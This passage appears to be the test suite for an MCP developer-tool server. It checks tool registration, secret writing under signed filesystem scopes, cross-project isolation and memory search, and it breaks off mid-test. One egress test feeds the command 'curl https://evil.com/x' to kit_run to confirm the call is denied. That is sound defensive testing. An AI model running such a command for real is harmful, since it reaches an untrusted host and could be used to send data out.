import { describe, it, before, after, beforeEach, afterEach } from "node:test";
import assert from "node:assert/strict";
import { mkdtemp, writeFile, rm, mkdir, readFile } from "node:fs/promises";
import { existsSync } from "node:fs";
import { join } from "node:path";
import { tmpdir } from "node:os";
import { Client } from "@modelcontextprotocol/sdk/client/index.js";
import { InMemoryTransport } from "@modelcontextprotocol/sdk/inMemory.js";
import { createMcpServer, KIT_MCP_TOOLS } from "./mcp-server.js";
import { mcpExposedToolNames } from "./cli.js";
import { loadOrCreateIdentity } from "./identity.js";
import { signProfile } from "./profile/sign.js";
import { PROFILE_FILE } from "./profile/schema.js";

// Standard .gitignore so security check passes in temp dirs
const GITIGNORE = ".env\n.env.local\n.env.*.local\n";

const FIXTURE_EMPTY = `# empty kit config\n`;

const FIXTURE_CONFIG_SECRET = `
[secrets.keys]
APP_KEY = { source = "config", value = "hello" }
`;

const FIXTURE_MISSING_ENV_SECRET = `
[secrets.keys]
MISSING_VAR = { source = "env" }
`;

/**
 * Create a connected Client + McpServer pair using in-memory transport.
 * Returns the client (already connected) and a cleanup function.
 */
async function createTestClient(): Promise<{ client: Client; cleanup: () => Promise<void> }> {
  const server = createMcpServer();
  const [clientTransport, serverTransport] = InMemoryTransport.createLinkedPair();

  const client = new Client({ name: "test-client", version: "1.0.0" }, { capabilities: {} });

  await server.connect(serverTransport);
  await client.connect(clientTransport);

  return {
    client,
    cleanup: async () => {
      await client.close();
    },
  };
}

/** Parse JSON content from an MCP tool result */
function parseResult(result: Awaited<ReturnType<Client["callTool"]>>): unknown {
  const content = result.content as Array<{ type: string; text: string }>;
  assert.ok(content.length > 0, "Expected content in result");
  assert.equal(content[0].type, "text");
  return JSON.parse(content[0].text);
}

// ─── Tool registration ────────────────────────────────────────────────────────

describe("MCP server tool registration", () => {
  it("registers all tools", async () => {
    const { client, cleanup } = await createTestClient();
    try {
      const { tools } = await client.listTools();
      const names = tools.map((t) => t.name);
      assert.ok(names.includes("kit_check"), "kit_check missing");
      assert.ok(names.includes("kit_review"), "kit_review missing");
      assert.ok(names.includes("kit_secrets"), "kit_secrets missing");
      assert.ok(names.includes("kit_fix"), "kit_fix missing");
      assert.ok(names.includes("kit_init"), "kit_init missing");
      assert.ok(names.includes("kit_run"), "kit_run missing");
      assert.ok(names.includes("kit_context"), "kit_context missing");
      assert.ok(names.includes("kit_map"), "kit_map missing");
      assert.ok(names.includes("kit_triage"), "kit_triage missing");
      assert.ok(names.includes("kit_memory"), "kit_memory missing");
      assert.equal(tools.length, 10);
    } finally {
      await cleanup();
    }
  });

  // Drift guard for the frozen public surface: the canonical KIT_MCP_TOOLS list
  // (snapshotted in contracts/public-surface.json) must match the tools actually
  // registered on the server. Adding/removing a register_kit_* call without
  // updating KIT_MCP_TOOLS fails here.
  it("KIT_MCP_TOOLS matches the actually-registered tool names", async () => {
    const { client, cleanup } = await createTestClient();
    try {
      const { tools } = await client.listTools();
      const registered = tools.map((t) => t.name).sort();
      assert.deepEqual(registered, [...KIT_MCP_TOOLS].sort());
    } finally {
      await cleanup();
    }
  });

  // CLI = MCP: which verbs are exposed as MCP tools is OWNED by the CLI
  // COMMAND_REGISTRY (each descriptor's `mcp: true`), and mcpExposedToolNames()
  // derives the `kit_<verb>` names from it. This asserts KIT_MCP_TOOLS — and
  // therefore the actually-registered tools (guarded above) — match that single
  // source, so a verb can't be MCP-exposed without a registry entry, nor a
  // registry `mcp` marker exist without a registered tool.
  it("KIT_MCP_TOOLS matches the CLI COMMAND_REGISTRY mcp-exposed verbs (CLI = MCP)", () => {
    assert.deepEqual([...KIT_MCP_TOOLS].sort(), mcpExposedToolNames());
  });
});

// ─── kit_check ─────────────────────────────────────────────────────────────

describe("kit_check", () => {
  let tempDir: string;
  let savedCwd: string;

  // These tests pass `cwd: tempDir` while the test process sat in the kit repo. That used to
  // "work" only because kit_check's dimensions resolved paths from process.cwd(): the config came
  // from tempDir and the security/lock/test scan measured the kit repo. One assertion even
  // conceded it — "ok depends on repo-level security checks — test structure, not ok". kit_check
  // now REFUSES a cwd that differs from the process, so the tests chdir into the temp project.
  // They finally describe the project they claim to describe.
  before(async () => {
    tempDir = await mkdtemp(join(tmpdir(), "kit-mcp-check-"));
    await writeFile(join(tempDir, ".gitignore"), GITIGNORE, "utf-8");
    savedCwd = process.cwd();
    process.chdir(tempDir);
  });

  after(async () => {
    process.chdir(savedCwd);
    await rm(tempDir, { recursive: true, force: true });
  });

  it("returns zero tools and secrets with empty config", async () => {
    await writeFile(join(tempDir, ".kit.toml"), FIXTURE_EMPTY, "utf-8");
    const { client, cleanup } = await createTestClient();
    try {
      const result = await client.callTool({ name: "kit_check", arguments: { cwd: tempDir } });
      // ok depends on repo-level security checks — test structure, not ok
      const data = parseResult(result) as { ok: boolean; tools: unknown[]; secrets: unknown[] };
      assert.equal(data.tools.length, 0);
      assert.equal(data.secrets.length, 0);
    } finally {
      await cleanup();
    }
  });

  it("reports config-source secret as available", async () => {
    await writeFile(join(tempDir, ".kit.toml"), FIXTURE_CONFIG_SECRET, "utf-8");
    const { client, cleanup } = await createTestClient();
    try {
      const result = await client.callTool({ name: "kit_check", arguments: { cwd: tempDir } });
      const data = parseResult(result) as { secrets: Array<{ name: string; available: boolean }> };
      // The secret itself is correct regardless of security check results
      assert.equal(data.secrets[0].name, "APP_KEY");
      assert.equal(data.secrets[0].available, true);
    } finally {
      await cleanup();
    }
  });

  it("returns ok:false when a required env secret is missing", async () => {
    await writeFile(join(tempDir, ".kit.toml"), FIXTURE_MISSING_ENV_SECRET, "utf-8");
    const { client, cleanup } = await createTestClient();
    try {
      const result = await client.callTool({ name: "kit_check", arguments: { cwd: tempDir } });
      const data = parseResult(result) as {
        ok: boolean;
        secrets: Array<{ name: string; available: boolean }>;
      };
      assert.equal(data.ok, false);
      assert.equal(data.secrets[0].name, "MISSING_VAR");
      assert.equal(data.secrets[0].available, false);
    } finally {
      await cleanup();
    }
  });

  it("result includes tools, secrets, security, locks keys", async () => {
    await writeFile(join(tempDir, ".kit.toml"), FIXTURE_EMPTY, "utf-8");
    const { client, cleanup } = await createTestClient();
    try {
      const result = await client.callTool({ name: "kit_check", arguments: { cwd: tempDir } });
      const data = parseResult(result) as Record<string, unknown>;
      assert.ok("ok" in data);
      assert.ok("tools" in data);
      assert.ok("secrets" in data);
      assert.ok("security" in data);
      assert.ok("locks" in data);
    } finally {
      await cleanup();
    }
  });
});

// ─── kit_review ──────────────────────────────────────────────────────────────

describe("kit_review", () => {
  let tempDir: string;
  let originalCwd: string;

  // Review's underlying scanners (design/standards/security) walk process.cwd()
  // — chdir into an isolated fixture so the audit covers the fixture, not this
  // repo (same isolation pattern as the kit_fix suite).
  before(async () => {
    originalCwd = process.cwd();
    tempDir = await mkdtemp(join(tmpdir(), "kit-mcp-review-"));
    await writeFile(join(tempDir, ".gitignore"), GITIGNORE, "utf-8");
    await writeFile(join(tempDir, ".kit.toml"), FIXTURE_EMPTY, "utf-8");
    process.chdir(tempDir);
  });

  after(async () => {
    process.chdir(originalCwd);
    await rm(tempDir, { recursive: true, force: true });
  });

  it("returns the structured report: ok, failed, and the four stages in order", async () => {
    const { client, cleanup } = await createTestClient();
    try {
      const result = await client.callTool({ name: "kit_review", arguments: { cwd: tempDir } });
      const data = parseResult(result) as {
        ok: boolean;
        failed: string[];
        stages: Array<{ stage: string; ok: boolean; summary: Record<string, number> }>;
      };
      assert.ok("ok" in data);
      assert.ok(Array.isArray(data.failed));
      assert.deepEqual(
        data.stages.map((s) => s.stage),
        ["check", "design", "standards", "adr"],
      );
      assert.equal(
        data.ok,
        data.stages.every((s) => s.ok),
      );
    } finally {
      await cleanup();
    }
  });

  it('stages: ["standards"] runs ONLY that gate — the fast read-only lint loop', async () => {
    const { client, cleanup } = await createTestClient();
    try {
      const result = await client.callTool({
        name: "kit_review",
        arguments: { cwd: tempDir, stages: ["standards"] },
      });
      const data = parseResult(result) as { stages: Array<{ stage: string }> };
      assert.deepEqual(
        data.stages.map((s) => s.stage),
        ["standards"],
        "no check/design/adr stage may run on a scoped call",
      );
    } finally {
      await cleanup();
    }
  });

  it("rejects an unknown stage name at the schema layer", async () => {
    const { client, cleanup } = await createTestClient();
    try {
      const result = await client.callTool({
        name: "kit_review",
        arguments: { cwd: tempDir, stages: ["lint"] },
      });
      assert.equal(result.isError, true);
      const content = result.content as Array<{ type: string; text: string }>;
      assert.match(content[0].text, /invalid|enum/i);
    } finally {
      await cleanup();
    }
  });

  it("concise:true strips pass/skip rows but keeps the per-stage counts honest", async () => {
    const { client, cleanup } = await createTestClient();
    try {
      const result = await client.callTool({
        name: "kit_review",
        arguments: { cwd: tempDir, concise: true },
      });
      const data = parseResult(result) as {
        stages: Array<{
          stage: string;
          findings: Array<{ status: string }>;
          summary: { pass: number; fail: number; warn: number; skip: number };
        }>;
      };
      for (const s of data.stages) {
        assert.ok(
          s.findings.every((f) => f.status === "fail" || f.status === "warn"),
          `${s.stage}: concise mode leaked a ${s.findings.find((f) => f.status !== "fail" && f.status !== "warn")?.status} row`,
        );
        // The summary still covers the dropped rows — nothing silently truncated.
        assert.ok("pass" in s.summary && "skip" in s.summary);
        assert.equal(s.findings.length, s.summary.fail + s.summary.warn);
      }
    } finally {
      await cleanup();
    }
  });
});

// ─── kit_fix ───────────────────────────────────────────────────────────────

describe("kit_fix", () => {
  let tempDir: string;
  let originalCwd: string;

  // Lock functions use process.cwd() — chdir to temp dir for isolation
  beforeEach(async () => {
    originalCwd = process.cwd();
    tempDir = await mkdtemp(join(tmpdir(), "kit-mcp-fix-"));
    await writeFile(join(tempDir, ".gitignore"), GITIGNORE, "utf-8");
    process.chdir(tempDir);
  });

  afterEach(async () => {
    process.chdir(originalCwd);
    await rm(tempDir, { recursive: true, force: true });
  });

  it("returns ok:true and generates lock files", async () => {
    await writeFile(join(tempDir, ".kit.toml"), FIXTURE_EMPTY, "utf-8");
    const { client, cleanup } = await createTestClient();
    try {
      const result = await client.callTool({ name: "kit_fix", arguments: {} });
      const data = parseResult(result) as {
        ok: boolean;
        actions: Array<{ name: string; action: string }>;
      };
      assert.equal(data.ok, true);
      const names = data.actions.map((a) => a.name);
      assert.ok(names.includes("skills-lock.json"), "skills-lock.json not generated");
      assert.ok(names.includes("cli-lock.json"), "cli-lock.json not generated");
    } finally {
      await cleanup();
    }
  });

  it("returns ok:true with no actions when lock files already exist", async () => {
    await writeFile(join(tempDir, ".kit.toml"), FIXTURE_EMPTY, "utf-8");
    const { client: c1, cleanup: cl1 } = await createTestClient();
    try {
      await c1.callTool({ name: "kit_fix", arguments: {} });
    } finally {
      await cl1();
    }
    // Run fix again — lock files already exist
    const { client: c2, cleanup: cl2 } = await createTestClient();
    try {
      const result = await c2.callTool({ name: "kit_fix", arguments: {} });
      const data = parseResult(result) as { ok: boolean; actions: unknown[] };
      assert.equal(data.ok, true);
      assert.equal(data.actions.length, 0);
    } finally {
      await cl2();
    }
  });
});

// ─── kit_secrets ──────────────────────────────────────────────────────────

describe("kit_secrets", () => {
  let tempDir: string;

  beforeEach(async () => {
    tempDir = await mkdtemp(join(tmpdir(), "kit-mcp-secrets-"));
  });

  afterEach(async () => {
    await rm(tempDir, { recursive: true, force: true });
  });

  it("returns no written keys when no secrets configured", async () => {
    await writeFile(join(tempDir, ".kit.toml"), FIXTURE_EMPTY, "utf-8");
    const { client, cleanup } = await createTestClient();
    try {
      const result = await client.callTool({ name: "kit_secrets", arguments: { cwd: tempDir } });
      const data = parseResult(result) as { written: unknown[]; message: string };
      assert.ok(data.message.includes("No secrets"));
    } finally {
      await cleanup();
    }
  });

  it("resolves config-source secrets and returns written keys", async () => {
    await writeFile(join(tempDir, ".kit.toml"), FIXTURE_CONFIG_SECRET, "utf-8");
    const { client, cleanup } = await createTestClient();
    try {
      const result = await client.callTool({ name: "kit_secrets", arguments: { cwd: tempDir } });
      const data = parseResult(result) as { ok: boolean; writtenKeys: string[] };
      assert.equal(data.ok, true);
      assert.ok(data.writtenKeys.includes("APP_KEY"));
    } finally {
      await cleanup();
    }
  });
});

// ─── kit_secrets under [scope].enforce_runtime (exec-broker at the MCP runtime) ──────────
describe("kit_secrets + signed-scope runtime enforcement (MCP-runtime adoption step 2)", () => {
  let tempDir: string;
  let idDir: string;
  let savedId: string | undefined;

  beforeEach(async () => {
    tempDir = await mkdtemp(join(tmpdir(), "kit-mcp-secfs-"));
    idDir = await mkdtemp(join(tmpdir(), "kit-mcp-id-"));
    savedId = process.env.KIT_IDENTITY_DIR;
    process.env.KIT_IDENTITY_DIR = idDir;
    loadOrCreateIdentity();
    await writeFile(join(tempDir, ".kit.toml"), FIXTURE_CONFIG_SECRET, "utf-8");
  });

  afterEach(async () => {
    if (savedId === undefined) delete process.env.KIT_IDENTITY_DIR;
    else process.env.KIT_IDENTITY_DIR = savedId;
    await rm(tempDir, { recursive: true, force: true });
    await rm(idDir, { recursive: true, force: true });
  });

  it("ALLOWS the .env.local write when it is inside the signed [scope].fs (default root)", async () => {
    await writeFile(join(tempDir, PROFILE_FILE), `version = 1\n[scope]\nenforce_runtime = true\n`);
    await signProfile(tempDir);
    const { client, cleanup } = await createTestClient();
    try {
      const result = await client.callTool({ name: "kit_secrets", arguments: { cwd: tempDir } });
      const data = parseResult(result) as { ok: boolean; writtenKeys: string[] };
      assert.equal(data.ok, true);
      assert.ok(data.writtenKeys.includes("APP_KEY"));
    } finally {
      await cleanup();
    }
  });

  it("DENIES the .env.local write when it is outside the signed [scope].fs", async () => {
    // fs scope is "src" only ⇒ the root .env.local write is off-scope ⇒ broker default-denies.
    await writeFile(
      join(tempDir, PROFILE_FILE),
      `version = 1\n[scope]\nfs = ["src"]\nenforce_runtime = true\n`,
    );
    await signProfile(tempDir);
    const { client, cleanup } = await createTestClient();
    try {
      const result = await client.callTool({ name: "kit_secrets", arguments: { cwd: tempDir } });
      assert.equal(result.isError, true, "off-scope .env.local write must be denied");
    } finally {
      await cleanup();
    }
  });

  it("fail-closed deny when enforce_runtime is declared but the scope is UNSIGNED", async () => {
    await writeFile(join(tempDir, PROFILE_FILE), `version = 1\n[scope]\nenforce_runtime = true\n`);
    // Deliberately NOT signed — opted into runtime enforcement but the scope is untrustworthy.
    const { client, cleanup } = await createTestClient();
    try {
      const result = await client.callTool({ name: "kit_secrets", arguments: { cwd: tempDir } });
      assert.equal(
        result.isError,
        true,
        "opted into runtime enforcement + unsigned ⇒ default-deny",
      );
    } finally {
      await cleanup();
    }
  });

  it("default-on (no enforce_runtime) OBSERVES but never denies (write proceeds)", async () => {
    // A signed scope that does NOT set the flag ⇒ default-on observe ⇒ would-be denials are audited
    // but the write still proceeds (observe never denies), even though .env.local is off the fs scope.
    await writeFile(join(tempDir, PROFILE_FILE), `version = 1\n[scope]\nfs = ["src"]\n`);
    await signProfile(tempDir);
    const { client, cleanup } = await createTestClient();
    try {
      const result = await client.callTool({ name: "kit_secrets", arguments: { cwd: tempDir } });
      const data = parseResult(result) as { ok: boolean; writtenKeys: string[] };
      assert.equal(
        data.ok,
        true,
        "observe-by-default never denies even though .env.local is off the fs scope",
      );
      assert.ok(data.writtenKeys.includes("APP_KEY"));
    } finally {
      await cleanup();
    }
  });
});

// ─── kit_run per-command egress mediation (MCP-runtime adoption step 4) ──────────────────
describe("kit_run + signed-scope egress mediation", () => {
  let tempDir: string;
  let idDir: string;
  let savedId: string | undefined;

  const SCOPED = `version = 1\n[scope]\negress = ["api.acme.com"]\nenforce_runtime = true\n`;

  beforeEach(async () => {
    tempDir = await mkdtemp(join(tmpdir(), "kit-mcp-run-"));
    idDir = await mkdtemp(join(tmpdir(), "kit-mcp-id-"));
    savedId = process.env.KIT_IDENTITY_DIR;
    process.env.KIT_IDENTITY_DIR = idDir;
    loadOrCreateIdentity();
    await writeFile(join(tempDir, ".kit.toml"), FIXTURE_EMPTY, "utf-8");
    await writeFile(join(tempDir, PROFILE_FILE), SCOPED);
    await signProfile(tempDir);
  });

  afterEach(async () => {
    if (savedId === undefined) delete process.env.KIT_IDENTITY_DIR;
    else process.env.KIT_IDENTITY_DIR = savedId;
    await rm(tempDir, { recursive: true, force: true });
    await rm(idDir, { recursive: true, force: true });
  });

  it("DENIES a command whose explicit URL is outside the signed [scope].egress", async () => {
    const { client, cleanup } = await createTestClient();
    try {
      const result = await client.callTool({
        name: "kit_run",
        arguments: { command: "curl https://evil.com/x", cwd: tempDir },
      });
      assert.equal(
        result.isError,
        true,
        "off-scope egress in the command must be denied pre-spawn",
      );
    } finally {
      await cleanup();
    }
  });

  it("ALLOWS a command with no explicit URL (documented conservative limit)", async () => {
    const { client, cleanup } = await createTestClient();
    try {
      const result = await client.callTool({
        name: "kit_run",
        arguments: { command: "echo hello", cwd: tempDir },
      });
      assert.notEqual(result.isError, true);
      const text = (result.content as Array<{ text: string }>)[0].text;
      assert.match(text, /hello/);
    } finally {
      await cleanup();
    }
  });
});

// ─── kit_init ──────────────────────────────────────────────────────────────

describe("kit_init", () => {
  let tempDir: string;

  before(async () => {
    tempDir = await mkdtemp(join(tmpdir(), "kit-mcp-init-"));
    await writeFile(join(tempDir, ".gitignore"), GITIGNORE, "utf-8");
  });

  after(async () => {
    await rm(tempDir, { recursive: true, force: true });
  });

  it("returns detectedStack and generatedConfig", async () => {
    // Use a project dir with a package.json so detection has something to work with
    const projectDir = join(tempDir, "nextjs-proj");
    await mkdtemp(projectDir).catch(() => null);
    await mkdir(projectDir, { recursive: true });
    await writeFile(
      join(projectDir, "package.json"),
      JSON.stringify({ dependencies: { next: "14.0.0" } }),
      "utf-8",
    );

    const { client, cleanup } = await createTestClient();
    try {
      const result = await client.callTool({
        name: "kit_init",
        arguments: { cwd: projectDir, dry_run: true },
      });
      const data = parseResult(result) as {
        detectedStack: { language: string; framework?: string };
        generatedConfig: string;
        written: boolean;
        alreadyExists: boolean;
      };
      assert.equal(data.detectedStack.language, "typescript");
      assert.equal(data.detectedStack.framework, "nextjs");
      assert.ok(
        data.generatedConfig.includes("[tools]"),
        `expected [tools]: ${data.generatedConfig}`,
      );
      assert.equal(data.written, false, "dry_run=true should not write");
    } finally {
      await cleanup();
    }
  });

  it("dry_run=true does not create .kit.toml", async () => {
    const projectDir = join(tempDir, "dryrun-proj");
    await mkdir(projectDir, { recursive: true });
    await writeFile(
      join(projectDir, "package.json"),
      JSON.stringify({ dependencies: { next: "14.0.0" } }),
      "utf-8",
    );

    const { client, cleanup } = await createTestClient();
    try {
      await client.callTool({
        name: "kit_init",
        arguments: { cwd: projectDir, dry_run: true },
      });

      // File should NOT have been created
      let fileExists = false;
      try {
        await rm(join(projectDir, ".kit.toml"), { force: false });
        fileExists = true;
      } catch {
        fileExists = false;
      }
      assert.equal(fileExists, false, "dry_run should not write .kit.toml");
    } finally {
      await cleanup();
    }
  });

  it("dry_run=false writes .kit.toml", async () => {
    const projectDir = join(tempDir, "write-proj");
    await mkdir(projectDir, { recursive: true });
    await writeFile(
      join(projectDir, "package.json"),
      JSON.stringify({ dependencies: { next: "14.0.0" } }),
      "utf-8",
    );

    const { client, cleanup } = await createTestClient();
    try {
      const result = await client.callTool({
        name: "kit_init",
        arguments: { cwd: projectDir, dry_run: false },
      });
      const data = parseResult(result) as { written: boolean };
      assert.equal(data.written, true, "dry_run=false should write file");

      // File should exist
      const content = await readFile(join(projectDir, ".kit.toml"), "utf-8");
      assert.ok(content.length > 0, ".kit.toml should have content");
    } finally {
      await cleanup();
    }
  });

  it("does not overwrite existing .kit.toml", async () => {
    const projectDir = join(tempDir, "existing-proj");
    await mkdir(projectDir, { recursive: true });
    const original = '# existing\n[tools]\nnode = "18"\n';
    await writeFile(join(projectDir, ".kit.toml"), original, "utf-8");
    await writeFile(
      join(projectDir, "package.json"),
      JSON.stringify({ dependencies: { next: "14.0.0" } }),
      "utf-8",
    );

    const { client, cleanup } = await createTestClient();
    try {
      const result = await client.callTool({
        name: "kit_init",
        arguments: { cwd: projectDir, dry_run: false },
      });
      const data = parseResult(result) as { written: boolean; alreadyExists: boolean };
      assert.equal(data.alreadyExists, true);
      assert.equal(data.written, false, "should not overwrite existing config");

      const content = await readFile(join(projectDir, ".kit.toml"), "utf-8");
      assert.equal(content, original, "original content should be unchanged");
    } finally {
      await cleanup();
    }
  });

  it("merges user init defaults ([init] services) — the same merge the CLI flow applies", async () => {
    const projectDir = join(tempDir, "defaults-proj");
    await mkdir(projectDir, { recursive: true });
    await writeFile(
      join(projectDir, "package.json"),
      JSON.stringify({ dependencies: { next: "14.0.0" } }),
      "utf-8",
    );
    const defaultsFile = join(tempDir, "defaults.toml");
    await writeFile(defaultsFile, `[init]\nservices = ["sentry", "nope-service"]\n`, "utf-8");
    const prev = process.env.KIT_DEFAULTS_FILE;
    process.env.KIT_DEFAULTS_FILE = defaultsFile;
    const { client, cleanup } = await createTestClient();
    try {
      const result = await client.callTool({
        name: "kit_init",
        arguments: { cwd: projectDir, dry_run: true },
      });
      const data = parseResult(result) as {
        detectedStack: { services: string[] };
        appliedDefaults: string[];
        unknownDefaults: string[];
        generatedConfig: string;
      };
      assert.ok(data.appliedDefaults.includes("sentry"), "sentry default not applied");
      assert.deepEqual(data.unknownDefaults, ["nope-service"], "unknown id must be reported");
      assert.ok(data.detectedStack.services.includes("sentry"));
      assert.match(data.generatedConfig, /sentry/, "generated config must carry the default");
    } finally {
      if (prev === undefined) delete process.env.KIT_DEFAULTS_FILE;
      else process.env.KIT_DEFAULTS_FILE = prev;
      await cleanup();
    }
  });
});

// ─── kit_map ───────────────────────────────────────────────────────────────
/**
 * A cross-project `cwd` is SERVED now. It used to be answered wrongly, then refused, and these
 * tests are what changed the third time.
 *
 * The probe that found the original defect: give project A a complete `.gitignore` and project B
 * none, launch the server in A, then call `kit_check({cwd: B})`. It replied
 * `pass — all .env patterns in .gitignore` about a project with no .gitignore at all — a security
 * pass earned by the wrong tree. `kit_fix` was worse: it created B's lock files inside A. A
 * refusal guard stood in for the fix while `cwd` was threaded through the dimensions, the lock
 * writers, the design scan and the audit destination.
 *
 * These tests are the ones that justify removing that guard, so they are written to fail if any of
 * it regresses: the server's `process.cwd()` is the kit repo, `other` is a temp project, and each
 * assertion is about `other`'s contents specifically — not merely that a call succeeded. A build
 * that reverted any part of the threading answers about the kit repo instead and fails here.
 */
describe("process-scoped tools serve a cross-project cwd", () => {
  let other: string;

  before(async () => {
    other = await mkdtemp(join(tmpdir(), "kit-mcp-other-"));
    await writeFile(join(other, ".kit.toml"), FIXTURE_EMPTY, "utf-8");
    // Deliberately NO .gitignore: the kit repo the server runs in has a complete one, so this is
    // the discriminating fixture. "warn" here means the answer came from `other`; "pass" would
    // mean it came from the server's own tree.
  });

  after(async () => {
    await rm(other, { recursive: true, force: true });
  });

  it("kit_check reports the REQUESTED project's gitignore state, not the server's", async () => {
    const { client, cleanup } = await createTestClient();
    try {
      const result = await client.callTool({ name: "kit_check", arguments: { cwd: other } });
      assert.notEqual(result.isError, true, "a cross-project check is served, not refused");
      const data = parseResult(result) as {
        security?: { name: string; status: string; detail?: string }[];
      };
      const row = (data.security ?? []).find((c) => c.name.includes("gitignore"));
      assert.ok(row, "the security dimension must report a gitignore row");
      assert.notEqual(
        row.status,
        "pass",
        `a project with no .gitignore must not get the server repo's pass (got ${row.status}: ${row.detail})`,
      );
    } finally {
      await cleanup();
    }
  });

  it("kit_review's design stage describes the requested project", async () => {
    const { client, cleanup } = await createTestClient();
    try {
      const result = await client.callTool({
        name: "kit_review",
        arguments: { cwd: other, stages: ["design"] },
      });
      assert.notEqual(result.isError, true);
      const data = parseResult(result) as {
        stages: { stage: string; findings: { detail?: string }[] }[];
      };
      const design = data.stages.find((s) => s.stage === "design");
      assert.ok(design, "the design stage must be present");
      // The kit repo has hundreds of components; `other` has no src/ at all. Reporting the repo's
      // findings for `other` is the exact false green the guard was standing in for.
      const text = JSON.stringify(design.findings);
      assert.doesNotMatch(
        text,
        /\.tsx|\.jsx/,
        `a project with no components must not be described by the server repo's files: ${text}`,
      );
    } finally {
      await cleanup();
    }
  });

  it("kit_fix writes into the requested project and leaves the server's tree alone", async () => {
    const { client, cleanup } = await createTestClient();
    const serverLock = join(process.cwd(), ".kit", "skills-lock.json");
    const serverLockBefore = existsSync(serverLock)
      ? await readFile(serverLock, "utf-8")
      : undefined;
    try {
      const result = await client.callTool({ name: "kit_fix", arguments: { cwd: other } });
      assert.notEqual(result.isError, true);

      assert.equal(
        existsSync(join(other, ".kit", "skills-lock.json")),
        true,
        "the requested project must receive its lock files",
      );
      // The negative half, and the one that matters: this test runs inside the kit repo, so a
      // regression would rewrite the repo's OWN lock file. Compare content, not just presence.
      const serverLockAfter = existsSync(serverLock)
        ? await readFile(serverLock, "utf-8")
        : undefined;
      assert.equal(
        serverLockAfter,
        serverLockBefore,
        "the server's own lock file must be untouched by a fix aimed elsewhere",
      );
    } finally {
      await cleanup();
    }
  });

  it("an ABSENT cwd is still fine — the common case must not regress", async () => {
    const { client, cleanup } = await createTestClient();
    try {
      const result = await client.callTool({ name: "kit_check", arguments: {} });
      assert.notEqual(result.isError, true);
      const data = parseResult(result) as { dimensions: Record<string, boolean> };
      assert.ok(data.dimensions, "a real verdict");
    } finally {
      await cleanup();
    }
  });

  it("a cwd EQUAL to the server's is fine, including a non-normalised spelling", async () => {
    const { client, cleanup } = await createTestClient();
    try {
      // `<cwd>/.` resolves to the same directory. This was a guard-era regression test (a lexical
      // compare refused the same directory spelled differently); it is kept because the spelling
      // must still resolve correctly now that it is threaded rather than compared.
      const result = await client.callTool({
        name: "kit_check",
        arguments: { cwd: join(process.cwd(), ".") },
      });
      assert.notEqual(result.isError, true);
    } finally {
      await cleanup();
    }
  });
});

describe("kit_map", () => {
  it("returns the relevant import-slice around a seed (deterministic, read-only)", async () => {
    const dir = await mkdtemp(join(tmpdir(), "kit-mcp-map-"));
    await mkdir(join(dir, "src"), { recursive: true });
    await writeFile(
      join(dir, "src", "a.ts"),
      `import { b } from "./b.js";\nexport const a = b;\n`,
      "utf-8",
    );
    await writeFile(join(dir, "src", "b.ts"), `export const b = 1;\n`, "utf-8");
    await writeFile(join(dir, "src", "unrelated.ts"), `export const z = 0;\n`, "utf-8");

    const { client, cleanup } = await createTestClient();
    try {
      const result = await client.callTool({
        name: "kit_map",
        arguments: { paths: ["src/a.ts"], cwd: dir },
      });
      const data = parseResult(result) as {
        slice: { nodes: { id: string; kind: string }[] };
        ownerSource: string;
      };
      const files = data.slice.nodes
        .filter((n) => n.kind === "file")
        .map((n) => n.id)
        .sort();
      assert.deepEqual(
        files,
        ["src/a.ts", "src/b.ts"],
        "a's import-neighborhood, not unrelated.ts",
      );
      assert.ok(["codeowners", "git", "none"].includes(data.ownerSource));
    } finally {
      await rm(dir, { recursive: true, force: true });
      await cleanup();
    }
  });
});

// ─── kit_triage ───────────────────────────────────────────────────────────────

describe("kit_triage tool", () => {
  it("refuses in read-only mode (the pass could not be recorded, so fail closed)", async () => {
    const { client, cleanup } = await createTestClient();
    process.env.KIT_READ_ONLY = "1";
    try {
      const result = await client.callTool({
        name: "kit_triage",
        arguments: { type: "npm", target: "left-pad" },
      });
      assert.equal(result.isError, true);
      const content = result.content as Array<{ type: string; text: string }>;
      assert.match(content[0].text, /read-only mode/);
    } finally {
      delete process.env.KIT_READ_ONLY;
      await cleanup();
    }
  });

  it("rejects an unknown triage type at the schema layer", async () => {
    const { client, cleanup } = await createTestClient();
    try {
      // "tools" is a CLI-only listing verb, deliberately NOT in the MCP enum —
      // the schema must refuse it before any triage logic runs. The SDK surfaces
      // zod validation failures as an error RESULT (not a transport rejection).
      const result = await client.callTool({
        name: "kit_triage",
        arguments: { type: "tools", target: "x" },
      });
      assert.equal(result.isError, true);
      const content = result.content as Array<{ type: string; text: string }>;
      assert.match(content[0].text, /invalid|enum/i);
    } finally {
      await cleanup();
    }
  });
});

// ─── kit_memory ───────────────────────────────────────────────────────────────

describe("kit_memory tool", () => {
  it("returns an empty result — and does NOT create a store — when none exists", async () => {
    const dir = await mkdtemp(join(tmpdir(), "kit-mcp-memory-"));
    const prevDir = process.env.KIT_MEMORY_DIR;
    const prevDb = process.env.KIT_MEMORY_DB;
    process.env.KIT_MEMORY_DIR = join(dir, "no-store");
    delete process.env.KIT_MEMORY_DB;
    const { client, cleanup } = await createTestClient();
    try {
      const result = await client.callTool({
        name: "kit_memory",
        arguments: { query: "anything at all", cwd: dir },
      });
      const data = parseResult(result) as { messages: unknown[]; shared: unknown[]; note?: string };
      assert.deepEqual(data.messages, []);
      assert.deepEqual(data.shared, []);
      assert.match(data.note ?? "", /no memory store/);
      // The search must not have materialized a db as a side effect of a read.
      const { existsSync } = await import("node:fs");
      assert.equal(
        existsSync(join(dir, "no-store", "memory.db")),
        false,
        "a read-only search created a memory store",
      );
    } finally {
      if (prevDir === undefined) delete process.env.KIT_MEMORY_DIR;
      else process.env.KIT_MEMORY_DIR = prevDir;
      if (prevDb !== undefined) process.env.KIT_MEMORY_DB = prevDb;
      await rm(dir, { recursive: true, force: true });
      await cleanup();
    }
  });

  it("finds an indexed message scoped to the current project", async () => {
    const dir = await mkdtemp(join(tmpdir(), "kit-mcp-memory-hit-"));
    const prevDir = process.env.KIT_MEMORY_DIR;
    const prevDb = process.env.KIT_MEMORY_DB;
    process.env.KIT_MEMORY_DIR = join(dir, "store");
    delete process.env.KIT_MEMORY_DB;
    const { client, cleanup } = await createTestClient();
    try {
      // Seed a store through the real db API (same path the indexer uses).
      const { openMemoryDb, upsertSession, insertMessage } = await import("./memory/db.js");
      const db = openMemoryDb();
      upsertSession(db, { sessionId: "s1", harness: "claude-code", project: dir });
      insertMessage(db, {
        uuid: "m1",
        sessionId: "s1",
        type: "user",
        role: "user",
        content: "we decided to pin the maintainer GPG fingerprint in CI",
